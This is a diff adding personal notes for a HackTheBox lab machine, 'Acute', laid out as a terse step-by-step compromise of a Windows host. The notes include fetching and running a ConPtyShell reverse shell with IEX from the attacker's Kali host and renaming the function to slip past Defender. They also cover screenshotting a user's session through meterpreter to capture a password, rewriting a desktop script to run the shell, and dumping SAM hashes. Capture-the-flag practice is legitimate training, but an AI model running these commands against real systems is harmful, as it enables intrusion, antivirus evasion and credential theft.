@@ -1512,3 +1512,74 @@ WaitForSingleObject : malware setting a trigger time
 
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 
+hackthebox
+######################################################################
+//acute
+nmap -sC -sV -oA nmap/acute <IP>
+        443 open - Microsoft HTTP-API
+        leaks ssl common name in certificate (add to hosts file)
+        redo nmap and use hostname to get further info - get you to actual IIS
+Open the webpage, developer tools -> Network. Look for other subdomains
+Interrogate the webpage
+        Find link to Windows Powershell Web Access (WPWA)
+
+-WPWA
+need username, password, computer name
+gets us to a powershell prompt
+        hostname
+        ipconfig (find a different ip than htbox access)
+        gci c:\ -Force (look for weird files, -Force for hidden files)
+        host winpeas on kali
+wget -o winpeas.exe http://<KALI>/winpeas.exe (works)
+next step, get a reverse shell with conptyshell
+        Invoke-ConPTYShell.ps1 on github
+        Defender will flag, however we can
+        1. Delete the "How to use" section
+        2. change the name of the function from Invoke-ConPTYShell to ippsec
+                %s/ConPTYShell/ippsec/g
+-Invoke-ConPTYShell
+        kali>   stty raw -echo; (stty size; cat) | nc -lvnp 3001
+        WPWA>   IEX(IWR http://<KALI>Invoke-ConPtyShell.ps1 -UseBasicParsing)
+                ippsec <KALI> 3001 
+        or
+                IEX(New-Object Net.WebClient).downloadString("<URL>/Invoke-ConPtyShell.ps1")
+                ippsec <KALI> 3001
+Check for active users
+        get-process (SI column = 1 - the user is interactive)
+        we want to get access to the desktop to see what the user is doing
+        create meterpreter binary, upload to C:\utils (defender exclusion)
+        migrate <EXPLORER>
+        screenshot reveals the user actively interacting with a POSH session
+                take a few, and get a password
+        can use meterpreter screenshare (open html file, watch video of user)
+connect to computer using the user info
+$pass = ConvertTo-SecureString "<PASS>" -AsPlainText -Force
+$cred = New-Object System.Management.Automation.PSCredential("Acute\imonks", $pass)
+Enter-PSSession ATSERVER -Credential $cred -ConfigurationName <CONFIG>
+or
+Invoke-Command -ComputerName ATSServer -Credential $cred -ConfigurationName <CONFIG> -ScriptBlock { Get-Command }
+
+Find a script present on the desktop that runs a command.
+We want to replace that command with our own - but through the windows shell
+-Windows grep/replace
+((cat ..\desktop\wm.ps1 -Raw) -replace 'Get-Volume', 'IEX(New-Object Net.WebClient).downloadString("<URL>/Invoke-ConPtyShell.ps1")') | set-content -path ..\desktop\wm.ps1
+
+windows/gather/smart_hashdump
+or
+reg save SAM
+reg save SYSTEM
+download file
+secretsdump.py
+
+
+
+
+
+
+
+
+
+
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
